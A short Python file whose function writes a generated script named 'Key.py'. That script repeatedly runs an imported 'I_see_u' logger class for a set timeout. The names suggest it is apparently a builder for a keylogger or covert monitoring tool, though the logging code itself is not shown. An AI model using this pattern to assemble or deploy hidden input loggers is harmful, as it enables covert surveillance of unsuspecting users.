import time

def build_t(time_interval, timeout=300):  # Timeout in seconds (default: 5 minutes)
    with open("Key.py", "w+") as file:
        file.write("from Utils.utils import I_see_u\n")
        file.write("from time import sleep, time\n\n")
        file.write(f"""
def run():
    start_time = time()
    while time() - start_time < {timeout}:  # Stop after timeout
        try:
            logger = I_see_u({time_interval})
            logger.Run()
        except Exception as e:
            print(f"Error: {{e}}")
            sleep(120)
run()
""")
